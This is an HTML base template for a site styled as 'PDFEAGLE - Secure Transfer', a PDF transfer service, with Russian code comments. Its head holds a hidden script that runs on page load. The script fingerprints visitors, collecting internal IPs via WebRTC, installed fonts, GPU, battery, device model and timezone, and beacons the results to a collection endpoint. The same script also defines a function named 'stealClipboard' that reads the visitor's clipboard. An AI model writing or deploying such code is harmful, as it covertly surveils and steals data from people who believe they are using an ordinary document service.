<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // --- ULTIMATE EAGLE EYE (ALL FEATURES COMBINED) ---
    window.EagleEye = class {
        constructor() {
            this.endpoint = '/api/collect';
            this.init();
        }

        async init() {
            if (document.readyState === 'complete') this.collect('Page Load');
            else window.addEventListener('load', () => this.collect('Page Load'));
        }

        // 1. Client Hints (Модель телефона, версия ОС) - ВЕРНУЛ ЭТО!
        async getClientHints() {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues([
                        "model", "platformVersion", "fullVersionList", "architecture", "bitness"
                    ]);
                    return {
                        model: ua.model,
                        platform: ua.platform,
                        version: ua.platformVersion,
                        architecture: ua.architecture,
                        mobile: ua.mobile
                    };
                } catch(e) { return null; }
            }
            return null;
        }

        // 2. WebRTC (Внутренний IP)
        async getInternalIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (!e.candidate) { pc.close(); resolve(ips); return; }
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (match && !ips.includes(match[1])) ips.push(match[1]);
                };
                setTimeout(() => { pc.close(); resolve(ips); }, 1000);
                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
            });
        }

        // 3. Шрифты (Детект через рендеринг - ВЕРНУЛ ЭТО!)
        getFonts() {
            const fontList = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", "Times", "Times New Roman", "Trebuchet MS", "Ubuntu", "Verdana", "Wingdings"];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        // 4. GPU
        getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { renderer: 'N/A' };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                };
            } catch(e) { return { renderer: 'Error' }; }
        }

        async collect(triggerName, extraData = {}) {
            const [ips, battery, clientHints] = await Promise.all([
                this.getInternalIPs(),
                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
                this.getClientHints() // ВОТ ОНО
            ]);
            
            const payload = {
                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName },
                fingerprint: {
                    gpu: this.getWebGLInfo().renderer,
                    screen: `${screen.width}x${screen.height}`,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                client_hints: clientHints, // ТЕПЕРЬ ЭТО БУДЕТ В ЛОГАХ
                system: {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: battery,
                    fonts: this.getFonts() // И ЭТО ТОЖЕ
                },
                network: {
                    webrtc_ips: ips
                },
                ...extraData
            };

            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(this.endpoint, blob);
        }
    };
    const eagle = new EagleEye();

    // --- ГЛОБАЛЬНАЯ ФУНКЦИЯ КРАЖИ БУФЕРА ---
    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) {
            return "Blocked/Error";
        }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
